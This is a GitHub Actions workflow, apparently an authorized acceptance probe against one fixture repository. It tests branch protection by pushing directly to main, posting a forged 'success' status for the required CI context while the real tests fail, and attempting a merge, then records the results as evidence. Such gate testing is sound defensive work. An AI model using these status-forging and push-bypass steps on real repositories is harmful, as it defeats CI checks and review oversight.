name: Authorized gate bypass probe
on:
  push:
    branches: [work/github/attack]
permissions:
  contents: write
  pull-requests: write
  statuses: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v5
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: Run failing candidate honestly
        id: real_test
        continue-on-error: true
        run: python3 -m unittest discover -s tests -v
      - name: Probe direct push, forged status and merge
        env:
          GH_TOKEN: ${{ github.token }}
          HEAD_SHA: ${{ github.sha }}
          REAL_TEST_RESULT: ${{ steps.real_test.outcome }}
        run: |
          python3 - <<'PY'
          import json, os, subprocess, time
          from pathlib import Path
          from urllib.request import Request, urlopen
          from urllib.error import HTTPError
          repo = os.environ['GITHUB_REPOSITORY']
          assert repo == 'NomadAnget/atelier-automation-fixture-20261014'
          assert os.environ['GITHUB_REF_NAME'] == 'work/github/attack'
          head = os.environ['HEAD_SHA']
          evidence = {'repository': repo, 'head': head, 'real_test': os.environ['REAL_TEST_RESULT'],
                      'run_id': os.environ['GITHUB_RUN_ID']}
          def api(method, path, body=None):
              assert path.startswith('/repos/' + repo + '/')
              req = Request('https://api.github.com' + path, method=method,
                  headers={'Authorization':'Bearer ' + os.environ['GH_TOKEN'],
                           'Accept':'application/vnd.github+json', 'Content-Type':'application/json'},
                  data=json.dumps(body).encode() if body is not None else None)
              try:
                  with urlopen(req, timeout=30) as response:
                      raw = response.read()
                      return response.status, json.loads(raw) if raw else None
              except HTTPError as error:
                  raw = error.read()
                  return error.code, json.loads(raw) if raw else None
          code, before = api('GET', '/repos/' + repo + '/git/ref/heads/main')
          assert code == 200
          evidence['main_before'] = before['object']['sha']
          # Normal authenticated Git push, no force and no token persisted in config.
          subprocess.run(['git','fetch','--quiet','origin','main'], check=True)
          subprocess.run(['git','checkout','--quiet','--detach','origin/main'], check=True)
          subprocess.run(['git','config','user.name','acceptance-probe'], check=True)
          subprocess.run(['git','config','user.email','acceptance@localhost'], check=True)
          Path('direct-push-probe.txt').write_text('Synthetic T37 attempt; no production data.\n')
          subprocess.run(['git','add','direct-push-probe.txt'], check=True)
          subprocess.run(['git','commit','--quiet','-m','test: denied direct push probe'], check=True)
          helper = '!f() { echo username=x-access-token; echo "password=$GH_TOKEN"; }; f'
          pushed = subprocess.run(['git','-c','credential.helper=','-c',
              'credential.https://github.com.helper='+helper,'push','origin','HEAD:refs/heads/main'],
              capture_output=True,text=True)
          evidence['direct_push_exit'] = pushed.returncode
          evidence['direct_push_error'] = pushed.stderr
          evidence['main_after_direct_push'] = api('GET','/repos/'+repo+'/git/ref/heads/main')[1]['object']['sha']
          # Forge the same required context with the same built-in Actions integration.
          fake_code, fake = api('POST', '/repos/'+repo+'/statuses/'+head,
              {'state':'success','context':'atelier/trusted-ci',
               'description':'T42 synthetic forged green: real candidate failed',
               'target_url':'https://github.com/'+repo+'/actions/runs/'+os.environ['GITHUB_RUN_ID']})
          evidence['forged_status_http'] = fake_code
          evidence['forged_status_id'] = fake.get('id') if isinstance(fake,dict) else None
          # PR may be opened seconds after the source push. Observe it before attacking.
          pr = None
          for attempt in range(20):
              code, candidates = api('GET','/repos/'+repo+'/pulls?state=open&head=NomadAnget:work/github/attack')
              if code == 200 and candidates:
                  pr = candidates[0]
                  break
              time.sleep(3)
          assert pr and pr['head']['sha'] == head and pr['head']['repo']['id'] == 1417835354
          evidence['pr'] = pr['number']
          merge_code, merged = api('PUT','/repos/'+repo+'/pulls/'+str(pr['number'])+'/merge',
                                    {'merge_method':'merge','sha':head})
          evidence['merge_http'] = merge_code
          evidence['merge_reply'] = merged
          evidence['main_after_merge_attempt'] = api('GET','/repos/'+repo+'/git/ref/heads/main')[1]['object']['sha']
          Path('gate-probe-evidence.json').write_text(json.dumps(evidence,indent=2)+'\n')
          print(json.dumps(evidence,indent=2))
          PY
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: gate-probe-evidence
          path: gate-probe-evidence.json
